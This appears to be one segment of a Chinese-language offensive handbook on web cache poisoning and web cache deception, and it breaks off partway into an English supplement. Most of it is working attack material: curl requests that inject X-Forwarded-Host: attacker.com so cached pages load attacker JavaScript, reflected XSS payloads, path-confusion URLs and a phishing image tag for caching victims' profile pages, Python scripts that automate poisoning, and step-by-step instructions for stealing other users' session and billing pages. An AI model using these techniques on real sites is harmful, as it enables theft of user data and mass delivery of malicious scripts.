# cache-poisoning-test · part 1 · part 1

> 分段 1/2。索引见 `cache-poisoning-test-p1.md`。

# cache-poisoning-test · part 1

> 分段 1/3。完整索引见 `cache-poisoning-test.md`。

## 一、原有知识库

# 缓存投毒测试手册
## 一、Web 缓存投毒原理

### 核心概念

```
缓存键 (Cache Key): 决定缓存条目的唯一标识
  通常包含: Host, Path, Query String

Unkeyed 输入: 不在缓存键中，但影响响应内容的输入
  例如: X-Forwarded-Host, User-Agent, Cookie

攻击原理:
1. 找到 unkeyed 输入
2. 构造恶意请求，响应包含恶意内容
3. 响应被缓存
4. 其他用户访问相同 URL，获得被投毒的缓存
```

---
## 二、缓存键分析

### 2.1 识别缓存行为

```bash
# 发送两次相同请求，观察响应头
curl -I "https://target.com/page" -H "X-Test: 1"
curl -I "https://target.com/page" -H "X-Test: 2"

# 关注响应头:
# X-Cache: HIT / MISS
# CF-Cache-Status: HIT / MISS (Cloudflare)
# Age: 123 (缓存存在时间)
# Cache-Control: max-age=3600
```

### 2.2 测试 Unkeyed 输入

```python
import requests

def test_unkeyed_inputs(url):
    """测试哪些输入不在缓存键中"""
    
    headers_to_test = [
        "X-Forwarded-Host",
        "X-Forwarded-Scheme",
        "X-Original-URL",
        "X-Rewrite-URL",
        "X-Forwarded-Proto",
        "X-Host",
        "X-Forwarded-Server",
        "User-Agent",
        "Accept-Language",
        "Cookie",
    ]
    
    for header in headers_to_test:
        # 发送带有唯一值的请求
        unique_value = f"test-{header}-123"
        r1 = requests.get(url, headers={header: unique_value})
        
        # 再次请求（不带该头）
        r2 = requests.get(url)
        
        # 如果 r2 响应中包含 unique_value → 该头是 unkeyed
        if unique_value in r2.text:
            print(f"[!] Unkeyed 输入发现: {header}")
            print(f"    响应中包含: {unique_value}")
```

---
## 三、常见 Unkeyed 输入

### 3.1 X-Forwarded-Host

```bash
# 攻击: 修改资源加载路径
curl "https://target.com/" \
  -H "X-Forwarded-Host: attacker.com"

# 如果响应中包含:
<script src="//attacker.com/static/js/app.js"></script>

# 结果: 缓存被投毒，所有用户加载攻击者的 JS
```

### 3.2 X-Forwarded-Scheme / X-Forwarded-Proto

```bash
# 攻击: 降级 HTTPS 到 HTTP
curl "https://target.com/" \
  -H "X-Forwarded-Scheme: http"

# 响应中的链接可能变成:
<link href="http://target.com/style.css">

# 结果: 中间人攻击风险
```

### 3.3 X-Original-URL / X-Rewrite-URL

```bash
# 攻击: 缓存错误页面到正常 URL
curl "https://target.com/normal-page" \
  -H "X-Original-URL: /admin/secret"

# 如果后端用 X-Original-URL 路由，但缓存用原始 URL
# 结果: /normal-page 被缓存为 /admin/secret 的内容
```

### 3.4 UTM 参数

```bash
# 营销参数通常不在缓存键中
curl "https://target.com/?utm_source=<script>alert(1)</script>"

# 如果响应中反射该参数:
<div>来源: <script>alert(1)</script></div>

# 结果: XSS 被缓存
```

---
## 四、Web 缓存欺骗

### 缓存欺骗偷会话页（战法索引有指针）

认：登录后个人页、账单、`/api/me`、设置页。有 `X-Cache` / `Age` / `Via` 更好认，**不是前提**。

打：

1. 未登录先打原 path，记下基线（应 401 / 登录页 / 空）。
2. **要会话**打开同一页，再请求 `原path/x.css`、`原path;.css`、`原path%2f.css`。
3. 看 `X-Cache: HIT` / `Age` 涨了没有。再**未登录**打同一个带后缀 URL。

算成：未登录拿到**别人**个人页/账单/会话页正文（姓名、手机、Cookie 页）。只 HIT 了 CSS 壳不算。

假点：`Cache-Control: no-store`；后缀被应用 404；要受害人先点才缓存、你这边没拿到他人数据。单站没中不删战法索引这行。有会话页就可以打，不必先看见缓存头。没个人页/账单不要为了勾表空加后缀。

投毒（unkeyed 头把别人页面改成你的 JS）是另一条，细节在下半补充和附件。

### 4.1 路径混淆

```bash
# 原理: 缓存和应用对路径的解析不一致

# 攻击 1: 静态资源后缀
curl "https://target.com/profile/victim.css"

# 缓存: 认为是 CSS 文件，缓存
# 应用: 忽略 .css，返回 /profile/victim 的内容
# 结果: 受害者的个人信息被缓存为公开的 CSS 文件

# 攻击 2: 路径参数
curl "https://target.com/profile;.css"
curl "https://target.com/profile%2f.css"
curl "https://target.com/profile%2e%2e%2fstatic/style.css"
```

### 4.2 诱导受害者访问

```html
<!-- 攻击者发送钓鱼邮件 -->
<img src="https://target.com/profile/victim.css">

<!-- 受害者点击后，其个人信息被缓存 -->
<!-- 攻击者访问相同 URL，获取缓存的敏感信息 -->
```

---
## 五、缓存键规范化差异

### 5.1 编码差异

```bash
# 缓存和应用对 URL 编码的处理不同

# 请求 1
curl "https://target.com/page?param=value"

# 请求 2
curl "https://target.com/page?param=%76%61%6c%75%65"

# 如果缓存认为两者不同，但应用认为相同
# 可以绕过缓存，直接访问应用
```

### 5.2 路径规范化

```bash
# 请求 1
curl "https://target.com/page"

# 请求 2
curl "https://target.com/./page"
curl "https://target.com//page"
curl "https://target.com/page/"

# 不同的规范化可能导致缓存绕过或投毒
```

---
## 六、CDN 特定技巧

### 6.1 Cloudflare

```bash
# Cloudflare 缓存键: Host + Path + Query String (sorted)

# Unkeyed 输入:
# - CF-Connecting-IP
# - CF-IPCountry
# - CF-Visitor
# - Cookie (部分)

# 测试
curl "https://target.com/" \
  -H "CF-Connecting-IP: 127.0.0.1"
```

### 6.2 Akamai

```bash
# Akamai 缓存键: 可配置，通常包含 Host + Path

# Unkeyed 输入:
# - True-Client-IP
# - X-Forwarded-For
# - Pragma: akamai-x-cache-on (调试头)

# 测试
curl "https://target.com/" \
  -H "True-Client-IP: 127.0.0.1" \
  -H "Pragma: akamai-x-cache-on"
```

### 6.3 Fastly

```bash
# Fastly 缓存键: Host + Path + Query String

# Unkeyed 输入:
# - Fastly-Client-IP
# - X-Forwarded-Host
# - Surrogate-Key (缓存标签)

# 测试
curl "https://target.com/" \
  -H "X-Forwarded-Host: attacker.com"
```

---
## 七、测试工具

### 7.1 Param Miner (Burp 插件)

```
功能:
- 自动检测 unkeyed 输入
- 测试缓存键组成
- 识别缓存投毒机会

使用:
1. Burp → Extender → BApp Store → Param Miner
2. 右键请求 → Extensions → Param Miner → Guess headers
3. 查看结果
```

### 7.2 手动测试脚本

```python
import requests
import hashlib

def test_cache_poisoning(url, header, value):
    """测试缓存投毒"""
    
    # 生成唯一标识
    unique_id = hashlib.md5(f"{header}{value}".encode()).hexdigest()[:8]
    
    # 发送投毒请求
    poison_value = f"{value}-{unique_id}"
    r1 = requests.get(url, headers={header: poison_value})
    
    print(f"[*] 发送投毒请求: {header}: {poison_value}")
    print(f"    响应状态: {r1.status_code}")
    print(f"    缓存状态: {r1.headers.get('X-Cache', 'Unknown')}")
    
    # 等待缓存生效
    import time
    time.sleep(2)
    
    # 发送正常请求（不带恶意头）
    r2 = requests.get(url)
    
    print(f"[*] 发送正常请求")
    print(f"    响应状态: {r2.status_code}")
    print(f"    缓存状态: {r2.headers.get('X-Cache', 'Unknown')}")
    
    # 检查是否被投毒
    if unique_id in r2.text:
        print(f"[!] 缓存投毒成功！")
        print(f"    响应中包含: {unique_id}")
        return True
    else:
        print(f"[-] 缓存投毒失败")
        return False

# 使用示例
url = "https://target.com/"
headers_to_test = [
    ("X-Forwarded-Host", "attacker.com"),
    ("X-Forwarded-Scheme", "http"),
    ("X-Original-URL", "/admin"),
]

for header, value in headers_to_test:
    test_cache_poisoning(url, header, value)
    print("-" * 80)
```

### 7.3 缓存键探测

```python
def detect_cache_key(url):
    """探测缓存键组成"""
    
    import random
    
    components = {
        "Host": f"test{random.randint(1000,9999)}.com",
        "Path": f"/test{random.randint(1000,9999)}",
        "Query": f"?test={random.randint(1000,9999)}",
        "Method": "POST",
        "Body": f"test={random.randint(1000,9999)}",
    }
    
    results = {}
    
    # 测试每个组件
    for component, value in components.items():
        # 发送两次请求，第二次修改该组件
        r1 = requests.get(url)
        cache_status_1 = r1.headers.get('X-Cache', 'Unknown')
        
        if component == "Host":
            r2 = requests.get(url, headers={"Host": value})
        elif component == "Path":
            r2 = requests.get(url + value)
        elif component == "Query":
            r2 = requests.get(url + value)
        elif component == "Method":
            r2 = requests.post(url)
        elif component == "Body":
            r2 = requests.post(url, data=value)
        
        cache_status_2 = r2.headers.get('X-Cache', 'Unknown')
        
        # 如果第二次是 MISS，说明该组件在缓存键中
        if cache_status_2 == "MISS":
            results[component] = "In cache key"
        else:
            results[component] = "Not in cache key"
    
    return results
```

---
## 八、利用场景

### 8.1 XSS 缓存投毒

```bash
# 找到反射 XSS 点
curl "https://target.com/search?q=<script>alert(1)</script>"

# 如果该页面被缓存，所有用户访问时触发 XSS
```

### 8.2 钓鱼页面缓存

```bash
# 投毒首页，显示钓鱼内容
curl "https://target.com/" \
  -H "X-Forwarded-Host: attacker.com"

# 响应中加载攻击者的 JS，显示假登录框
```

### 8.3 敏感信息泄露

```bash
# 缓存欺骗，将个人信息缓存为公开资源
curl "https://target.com/profile/victim.css"

# 攻击者访问相同 URL，获取受害者信息
```

---
## 九、防护检测

```python
# 检测是否有防护

# 1. 严格的缓存键
# 特征: 所有影响响应的输入都在缓存键中

# 2. 输入验证
# 特征: 拒绝异常的 X-Forwarded-* 头

# 3. 缓存隔离
# 特征: 敏感页面不被缓存（Cache-Control: no-store）

# 4. 响应头检查
# 特征: 响应中不反射 unkeyed 输入
```

---
## 十一、参考资源

```
# Web Cache Poisoning 研究
https://portswigger.net/research/practical-web-cache-poisoning

# Web Cache Deception 研究
https://omergil.blogspot.com/2017/02/web-cache-deception-attack.html

# Burp Param Miner
https://github.com/PortSwigger/param-miner
```

---
## 二、补充：web-cache

### web-cache

### Web Cache Deception
## 1. CORE CONCEPTS

### Web Cache Deception (steal authenticated data)

The attacker tricks a victim into requesting their authenticated page at a URL that the cache considers static:

```
Victim visits: https://target.com/account/profile/nonexistent.css
→ Application ignores "nonexistent.css", serves /account/profile (with auth data)
→ CDN sees .css extension → caches the response
